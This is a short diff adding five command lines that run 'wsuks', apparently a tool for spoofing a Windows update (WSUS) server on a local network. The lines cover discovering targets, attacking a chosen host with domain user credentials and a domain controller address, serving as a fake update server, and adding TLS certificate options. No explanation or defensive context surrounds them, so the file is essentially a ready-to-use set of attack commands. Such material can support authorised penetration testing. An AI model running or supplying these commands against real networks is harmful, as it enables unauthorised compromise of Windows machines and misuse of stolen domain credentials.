@@ -1,0 +1,5 @@
+wsuks -I "$INTERFACE" --only-discover -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dc-ip "$DC_IP"
+wsuks -I "$INTERFACE" -t "$TARGET" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --dc-ip "$DC_IP"
+wsuks -I "$INTERFACE" -t "$TARGET" --WSUS-Server "wsus.$DOMAIN" -u "$USER" -d "$DOMAIN"
+wsuks -I "$INTERFACE" --serve-only
+wsuks -I "$INTERFACE" -t "$TARGET" --WSUS-Server "wsus.$DOMAIN" --tls-cert wsus.pem --tls-cert-key wsus.key -u "$USER" -d "$DOMAIN"
